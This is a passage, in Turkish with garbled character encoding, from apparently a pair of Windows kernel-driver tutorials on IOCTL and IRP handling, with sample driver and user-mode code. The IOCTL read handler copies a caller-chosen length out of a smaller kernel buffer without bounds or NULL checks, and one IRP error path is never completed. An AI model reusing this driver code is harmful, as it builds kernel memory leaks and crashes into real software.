0x800 ve 0x801 gibi deÄŸerler olabilir.\nMethod: IOCTL iÅŸleminin veriyi nasÄ±l ileteceÄŸini tanÄ±mlar. Bu parametreler METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, ve METHOD_NEITHER gibi seÃ§enekler bulunur. Kodumuzdaki METHOD_BUFFERED seÃ§eneÄŸi, verinin bir bellek tamponu aracÄ±lÄ±ÄŸÄ±yla taÅŸÄ±nmasÄ±nÄ± ifade eder.\nAccess: IOCTL iÅŸleminin hangi eriÅŸim izinlerine sahip olduÄŸunu belirtir. Bu parametre iÃ§in FILE_ANY_ACCESS, FILE_SHARE_READ, FILE_SHARE_WRITE gibi seÃ§enekler kullanÄ±labilir. Kodumuzdaki FILE_ANY_ACCESS, iÅŸlemin herhangi bir eriÅŸim iznine sahip olduÄŸunu ifade eder.\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Ä°lk olarak DriverEntry DeviceName ve SymName adÄ±nda iki adet UNICODE_STRING tanÄ±mladÄ±k. Bu iki deÄŸiÅŸken, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± tutmaktadÄ±r. Bu deÄŸiÅŸkenlerle, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± belirlemek iÃ§in kullanacaÄŸÄ±z.\nStatus = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygÄ±t nesnesi oluÅŸturuyoruz. Bu fonksiyon, sÃ¼rÃ¼cÃ¼mÃ¼z iÃ§in bir aygÄ±t nesnesi oluÅŸturur ve bu nesneyi DeviceObject deÄŸiÅŸkenine atar.\nStatus = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir baÄŸlantÄ± oluÅŸturuyoruz. Bu sayede, user mode programÄ±mÄ±zda sÃ¼rÃ¼cÃ¼nÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± kullanarak sÃ¼rÃ¼cÃ¼mÃ¼ze eriÅŸiyor olacaÄŸÄ±z.\nDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; Son olarak, sÃ¼rÃ¼cÃ¼de IRP istekleri iÃ§in IRP_MJ_CREATE, IRP_MJ_CLOSE ve IRP_MJ_DEVICE_CONTROL fonksiyonlarÄ±nÄ± belirliyoruz. Bu fonksiyonlar, gelecek IRP isteklerini iÅŸleyecek olan fonksiyonlardÄ±r. AyrÄ±ca, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n yÃ¼klenmesi sÄ±rasÄ±nda Ã§aÄŸrÄ±lacak olan UnloadDriver fonksiyonunu belirliyoruz.\nÅimdi ise IOCTL kodlarÄ±nÄ± iÅŸleyecek fonksiyona gÃ¶z atalÄ±m:\nPIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; Ä°lk olarak IoGetCurrentIrpStackLocation fonksiyonu ile mevcut IRP yÄ±ÄŸÄ±n konumunu alÄ±yoruz. Daha sonra, user-mode programÄ±mÄ±zÄ±n gÃ¶nderdiÄŸi veriyi almak iÃ§in Irp-\u003eAssociatedIrp.SystemBuffer kullanÄ±yoruz. AyrÄ±ca, IRPâ€™nin giriÅŸ ve Ã§Ä±kÄ±ÅŸ veri boyutlarÄ±nÄ± almak iÃ§in Stack-\u003eParameters.DeviceIoControl.OutputBufferLength ve Stack-\u003eParameters.DeviceIoControl.InputBufferLength kullanarak alÄ±yoruz. Son olarak, bellek tahsis etmek iÃ§in kullanacaÄŸÄ±mÄ±z TAG deÄŸerini tanÄ±mlÄ±yoruz.\nswitch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); Ä°lk olarak Stack-\u003eParameters.DeviceIoControl.IoControlCode ile user-modeâ€™Ä±n gÃ¶nderdiÄŸi IOCTL kodunu alÄ±yoruz. Hangi kod gÃ¶nderildiyse ona gÃ¶re iÅŸlemleri yapacaÄŸÄ±z.\nEÄŸer IOCTL_MEM_ALLOCATE kodu gelmiÅŸse, Ã¶ncelikle UserBufferâ€™Ä±n ve Lengthâ€™in kontrolÃ¼nÃ¼ yapÄ±yoruz. EÄŸer UserBuffer NULL ise veya Length 0 ise, hatalÄ± parametre hatasÄ± dÃ¶ndÃ¼rÃ¼yoruz. Daha sonra, ExAllocatePool2 fonksiyonu ile kernel-space tarafÄ±nda bellek tahsis ediyoruz. EÄŸer bellek tahsis edilemezse, yetersiz kaynak hatasÄ± dÃ¶ndÃ¼rÃ¼yoruz. Son olarak, RtlCopyMemory fonksiyonu ile user-modeâ€™dan gelen veriyi kernel-mode belleÄŸe kopyalÄ±yoruz.\nEÄŸer IOCTL_MEM_READ kodu gelmiÅŸse, kernel-space alanÄ±ndan ayrÄ±lan bellek adresinden veriyi alÄ±p UserBufferâ€™a kopyalÄ±yoruz ve Output olarak veriyi user-mode programa gÃ¶nderiyoruz.\ndefault kÄ±smÄ±nda ise geÃ§ersiz bir IOCTL kodu gÃ¶nderildiÄŸinde hata dÃ¶ndÃ¼rerek isteÄŸi bitiriyoruz.\nUser Mode - Program Åimdi ise user-mode programÄ±mÄ±za gÃ¶z atalÄ±m:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) int main(int argc, char* argv[]) { HANDLE HandleDevice = NULL; CHAR InBuffer[] = \"Piyanis bana biraaak\"; CHAR OutBuffer[sizeof(InBuffer)] = { 0 }; DWORD InputBytesReturned = 0; DWORD OutputBytesReturned = 0; BOOL Result = 0; HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); return 0; } User-mode kodumuzda bu. Åimdi detaylÄ±ca gÃ¶z atalÄ±m:\n#define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) User-mode programÄ±mÄ±zda ilk olarak iletiÅŸim kuracaÄŸÄ±mÄ±z sÃ¼rÃ¼cÃ¼nÃ¼n ismini ve yukarÄ±da bahsettiÄŸim aynÄ± CTL kodlarÄ±nÄ± tanÄ±mlÄ±yoruz.\nHandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kÄ±sÄ±mda ise CreateFile aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼mÃ¼zle iletiÅŸime geÃ§iyoruz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kÄ±sÄ±mda ise DeviceIoControl aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼mÃ¼ze IOCTL_MEM_ALLOCATE kodunu gÃ¶nderiyoruz. EÄŸer IOCTL kodu baÅŸarÄ±lÄ± bir ÅŸekilde gÃ¶nderilmezse hata dÃ¶ndÃ¼rÃ¼yoruz.\nParametrelere dikkat edin. Bizim ÅŸuan bu kod parÃ§asÄ±ndaki amacÄ±mÄ±z kernel-space alanÄ±ndan bir bellek ayrÄ±mÄ± yapmak ve gÃ¶nderdiÄŸimiz veriyi yazdÄ±rmasÄ±. Veri gÃ¶ndermek iÃ§in Input olarak verimizi ve uzunluÄŸunu gÃ¶nderiyoruz. Birazdan veri alÄ±rken bunu output iÃ§in yaptÄ±ÄŸÄ±mÄ±zÄ± gÃ¶receksiniz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); ArtÄ±k verimiz kernel alanÄ±na yazÄ±ldÄ± ve tekrar IOCTL_MEM_READ kodunu gÃ¶ndererek kernel-space alanÄ±ndan veriyi alÄ±yoruz. Bu sefer ise sÃ¼rÃ¼cÃ¼mÃ¼z bize veri gÃ¶ndereceÄŸi iÃ§in gÃ¶ndereceÄŸi verileri OutBuffer deÄŸiÅŸkenie aktarÄ±yoruz. Son olarak ise alÄ±nan veriyi ekrana yazdÄ±rÄ±yoruz.\nTekrardan parametrelere dikkat edin. Bu sefer Input parametreleri iÃ§in NULL ve 0 gÃ¶nderiyoruz. Ã‡Ã¼nkÃ¼ sadece veri alacaÄŸÄ±z. Output olarak ise OutBuffer ve OutBufferâ€™Ä±n uzunluÄŸunu veriyoruz.\nSÃ¼rÃ¼cÃ¼ ve ProgramÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± Ã–ncelikle sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ sisteme yÃ¼kleyip ardÄ±ndan Ã§alÄ±ÅŸtÄ±ralÄ±m:\nArdÄ±ndan user-mode programÄ±nÄ± Ã§alÄ±ÅŸtÄ±ralÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi programÄ±mÄ±zÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda Windbgâ€™dan user-mode programÄ±n gÃ¶nderdiÄŸi veriyi ekrana bastÄ±rdÄ±ÄŸÄ±nÄ±, ardÄ±ndan sÃ¼rÃ¼cÃ¼nÃ¼n user-mode programÄ±na gÃ¶nderdiÄŸi veriyi ekrana bastÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz.\nSonuÃ§ Bu konumuzda IOCTL hakkÄ±nda bilgi verdim ve basit bir Ã¶rnek Ã¼zerinden nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterdim. UmarÄ±m bu mekanizmayi daha iyi anlamanÄ±za yardÄ±mcÄ± olmuÅŸtur.\nÄ°yi Ã§alÄ±ÅŸmalar dilerim ğŸš€ğŸš€\nReferences Windows Docs - Introduction to I/O Control Codes Windows Docs - Device Input and Output Control ","sonuÃ§#SonuÃ§":"","sÃ¼rÃ¼cÃ¼-ve-programÄ±n-Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±#SÃ¼rÃ¼cÃ¼ ve ProgramÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±":""},"title":"IOCTL"},"/tr/docs/winkernel-dev/wkd-irp/":{"data":{"":"","code#Code":"","io-request-packet-irp-nedir#I/O Request Packet (IRP) Nedir?":"","references#References":"Merhabalar, Windows Kernel Developmentâ€™Ä±n ilk serisi olarak bu konuda sizlere I/O Request Packet (IRP) konusunu inceleyeceÄŸiz.\nI/O Request Packet (IRP) Nedir? I/O Request Packet, kÄ±saca IRP, Windows iÅŸletim sisteminde sÃ¼rÃ¼cÃ¼ler ile iÅŸletim sistemi arasÄ±nda bilgi alÄ±ÅŸveriÅŸini saÄŸlayan bir yapÄ±dÄ±r. Bunu bir â€œmesaj taÅŸÄ±yÄ±cÄ±sÄ±â€ gibi dÃ¼ÅŸÃ¼nebilirsiniz.\nGenellikle, sÃ¼rÃ¼cÃ¼lere gÃ¶nderilen talepler IRP olarak adlandÄ±rÄ±lan bu paketlerle gÃ¶nderilir. Bir iÅŸletim sistemi bileÅŸeni veya sÃ¼rÃ¼cÃ¼, IRPâ€™yi bir sÃ¼rÃ¼cÃ¼ye iletmek iÃ§in IoCallDriver adlÄ± bir fonksiyonu kullanÄ±r. Bu fonksiyon, bir aygÄ±t nesnesi (DEVICE_OBJECT) ve bir IRPâ€™yi iÅŸaret eden iki bilgi alÄ±r. AygÄ±t nesnesi, bu aygÄ±tla iliÅŸkili sÃ¼rÃ¼cÃ¼yÃ¼ (DRIVER_OBJECT) iÅŸaret eder. Bu yÃ¼zden, IoCallDriver fonksiyonu Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, IRP, ilgili aygÄ±t nesnesine veya bu nesneyle iliÅŸkili sÃ¼rÃ¼cÃ¼ye gÃ¶nderilir. Bazen bu iÅŸlem iÃ§in â€œIRPâ€™yi iletmekâ€ veya â€œIRPâ€™yi aktarmakâ€ gibi ifadeler de kullanÄ±lÄ±r.\nBir IRP, genellikle birden fazla sÃ¼rÃ¼cÃ¼ tarafÄ±ndan iÅŸlenir ve bu sÃ¼rÃ¼cÃ¼ler belirli bir sÄ±raya gÃ¶re dÃ¼zenlenmiÅŸtir. IRP iÅŸlenirken, sÃ¼rÃ¼cÃ¼ler yÄ±ÄŸÄ±nÄ±n her bir katmanÄ± gibi ele alÄ±nÄ±r. Yani, IRP Ã¶nce yÄ±ÄŸÄ±nÄ±n en Ã¼stÃ¼ndeki sÃ¼rÃ¼cÃ¼ye gelir. Her sÃ¼rÃ¼cÃ¼, IRPâ€™yi belirli bir sÄ±rayla iÅŸler ve gerekli iÅŸlemi yapar. Ä°ÅŸlem tamamlandÄ±ÄŸÄ±nda, IRP bir sonraki sÃ¼rÃ¼cÃ¼ye geÃ§er. Bu sÃ¼reÃ§, IRPâ€™nin adÄ±m adÄ±m iÅŸlenmesini saÄŸlar. SonuÃ§ olarak, IRP tÃ¼m sÃ¼rÃ¼cÃ¼lerden geÃ§tikten sonra nihai iÅŸlem gerÃ§ekleÅŸtirilir ve istenen sonuÃ§ elde edilir.\nIRP, kullanÄ±cÄ± tarafÄ±ndan baÅŸlatÄ±lan bir iÅŸlemin iÅŸletim sisteminin Ã§ekirdeÄŸi tarafÄ±ndan iÅŸlenmesini de saÄŸlar. Bu yapÄ± sayesinde, sÃ¼rÃ¼cÃ¼ler talepleri doÄŸru bir ÅŸekilde alÄ±r ve yanÄ±t verir. Ã–rneÄŸin, bir dosya yazdÄ±rmak istediÄŸinizde, bu talep IRP olarak yazÄ±cÄ± sÃ¼rÃ¼cÃ¼sÃ¼ne gÃ¶nderilir. YazÄ±cÄ± sÃ¼rÃ¼cÃ¼sÃ¼, IRPâ€™yi alÄ±r ve yazdÄ±rma iÅŸlemini baÅŸlatÄ±r. Bu sistem, kullanÄ±cÄ± iÅŸlemleri ile donanÄ±m arasÄ±ndaki baÄŸlantÄ±yÄ± gÃ¼venli ve verimli bir ÅŸekilde saÄŸlar.\nCode Ã–rnek kod iÃ§in iki ayrÄ± proje oluÅŸturacaÄŸÄ±z. Ä°lk projede bir sÃ¼rÃ¼cÃ¼ oluÅŸturacaÄŸÄ±z ve IRPâ€™in nasÄ±l iÅŸleneceÄŸinden bahsedeceÄŸim. DiÄŸer proje ise user mode bir program oluÅŸturacaÄŸÄ±z ve bu programda WriteFile fonksiyonunu kullanarak sÃ¼rÃ¼cÃ¼ye IRP gÃ¶ndermeyi gÃ¶stereceÄŸim.\nAyrÄ±ca Github link iÃ§in buraya tÄ±klayabilirsiniz.\nKernel Mode Driver #include \"main.h\" NTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); Irp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; DbgPrintEx(0, 0, \"\\n\\nMJ_WRITE Received!\\n\"); if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } DbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT PDrvObj, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Status = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } PDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT PDrvObj) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(PDrvObj-\u003eDeviceObject); return STATUS_SUCCESS; } Ã‡ok uzun gÃ¶zÃ¼ksede emin olun Ã§ok basit bir sÃ¼rÃ¼cÃ¼ kodu. AdÄ±m adÄ±m kodlara bakalÄ±m ve DriverEntry fonksiyonundan baÅŸlayalÄ±m:\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; Ä°lk olarak DeviceName ve SymName adÄ±nda iki adet UNICODE_STRING tanÄ±mladÄ±k. Bu iki deÄŸiÅŸken, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± tutmaktadÄ±r. Bu deÄŸiÅŸkenlerle, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± belirlemek iÃ§in kullanacaÄŸÄ±z.\nStatus = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygÄ±t nesnesi oluÅŸturuyoruz. Bu fonksiyon, sÃ¼rÃ¼cÃ¼mÃ¼z iÃ§in bir aygÄ±t nesnesi oluÅŸturur ve bu nesneyi DeviceObject deÄŸiÅŸkenine atar.\nStatus = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir baÄŸlantÄ± oluÅŸturuyoruz. Bu sayede, user mode programÄ±mÄ±zda sÃ¼rÃ¼cÃ¼nÃ¼n adÄ±nÄ± ve sembolik adÄ±nÄ± kullanarak sÃ¼rÃ¼cÃ¼mÃ¼ze eriÅŸiyor olacaÄŸÄ±z.\nPDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; Son olarak, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n IRP iÅŸlevlerini belirliyoruz. Bu iÅŸlevler, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n IRPâ€™leri nasÄ±l iÅŸleyeceÄŸini belirler. Kodlarda ise, IrpCreate ve IrpWrite kullanÄ±yoruz. MJ_CREATE, bir dosya oluÅŸturulduÄŸunda sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n ne yapacaÄŸÄ±nÄ± belirler. IrpWrite ise bir dosyaya yazÄ±ldÄ±ÄŸÄ±nda sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n ne yapacaÄŸÄ±nÄ± belirler. IRPâ€™ler, bu iÅŸlevler aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼mÃ¼ze iletilir ve sÃ¼rÃ¼cÃ¼mÃ¼z bu iÅŸlevler aracÄ±lÄ±ÄŸÄ±yla IRPâ€™leri iÅŸler.\nÅimdi ise IRP isteklerini iÅŸleyecek fonksiyonlarÄ±mÄ±za gÃ¶z atalÄ±m:\nNTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); ... Ä°lk olarak IrpCreateâ€™e baktÄ±ÄŸÄ±mÄ±zda DeviceObject ve Irp parametrelerini alÄ±r. Bu parametreler, yukarÄ±da bahsettiÄŸim gibi sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n aygÄ±t nesnesini ve IRPâ€™yi temsil eder. Daha sonra DbgPrintEx fonksiyonu ile bir bilgi mesajÄ± yazdÄ±rÄ±yoruz.\nIrp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; MJ_CREATE fonksiyonun son kÄ±smÄ±nda ise IRPâ€™nin durumunu ve bilgisini ayarlÄ±yoruz. Bu durum ve bilgi, IRPâ€™nin iÅŸlem sonucunu belirler. Son olarak, IoCompleteRequest fonksiyonu ile IRPâ€™yi tamamlÄ±yor ve iÅŸlemi sonlandÄ±rÄ±yoruz.\nÅimdi ise IrpWrite fonksiyonuna bakalÄ±m:\nNTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; ... TanÄ±mlanan deÄŸiÅŸkenlere gÃ¶z atalÄ±m:\nStack deÄŸiÅŸkeni, IRPâ€™nin yÄ±ÄŸÄ±n konumunu temsil eder. Buffer deÄŸiÅŸkeni, IRPâ€™nin veri alanÄ±nÄ± temsil eder. Bu veri alanÄ±, IRPâ€™nin taÅŸÄ±dÄ±ÄŸÄ± veriyi iÃ§erir. Length deÄŸiÅŸkeni, IRPâ€™nin veri uzunluÄŸunu temsil eder. Bu uzunluk, IRPâ€™nin taÅŸÄ±dÄ±ÄŸÄ± verinin uzunluÄŸunu belirtir. if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } Ä°lk olarak, Buffer iÅŸaretÃ§isinin NULL olup olmadÄ±ÄŸÄ± ve Length deÄŸerinin 0 olup olmadÄ±ÄŸÄ± kontrol ediyoruz.\nEÄŸer koÅŸul saÄŸlanÄ±yorsa yani veri alÄ±nmamÄ±ÅŸsa Irp-\u003eIoStatus.Status ile deÄŸeri STATUS_INVALID_PARAMETER olarak ayarlÄ±yoruz. Bu, bir parametre hatasÄ± olduÄŸunu belirtir. Irp-\u003eIoStatus.Information deÄŸeri 0 olarak ayarlÄ±yoruz. Sonda ise IRPâ€™nin iÅŸlem durumu dÃ¶ndÃ¼rÃ¼lerek iÅŸleme son verilir.\nDbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; Bu kÄ±sÄ±mda ise eÄŸer veri dÃ¼zgÃ¼nce alÄ±nmÄ±ÅŸsa bu veriyi yazdÄ±rÄ±rÄ±z. Daha sonra aynÄ± ÅŸekilde IRPâ€™nin durumunu ve bilgisini ayarlarÄ±z ve iÅŸlemi sonlandÄ±rÄ±rÄ±z.\nUser Mode Program Åimdi ise user mode programÄ±mÄ±zÄ± oluÅŸturalÄ±m. Bu programda WriteFile fonksiyonunu kullanarak sÃ¼rÃ¼cÃ¼mÃ¼ze IRP gÃ¶ndereceÄŸiz.\n#include \"main.h\" int main(int argc, char* argv[]) { HANDLE\tHandleDevice = NULL; CHAR\tBuffer[] = \"Hello, kernel!\"; DWORD\tBytesWritten = 0; DWORD\tBytesRead = 0; BOOL\tStatus\t= 0; HandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Status = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } CloseHandle(HandleDevice); return 0; } User mode program kodlarÄ±mÄ±z da bu ÅŸekilde. Åimdi detaylÄ±ca gÃ¶z atalÄ±m:\nHandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } ProgramÄ±mÄ±zda ilk olarak CreateFile aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ aÃ§Ä±yoruz. Bu fonksiyon, sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ aÃ§ar ve bir kolu (HANDLE) dÃ¶ndÃ¼rÃ¼r.\nâ€œCreateFile kullanÄ±larak sÃ¼rÃ¼cÃ¼ mÃ¼ 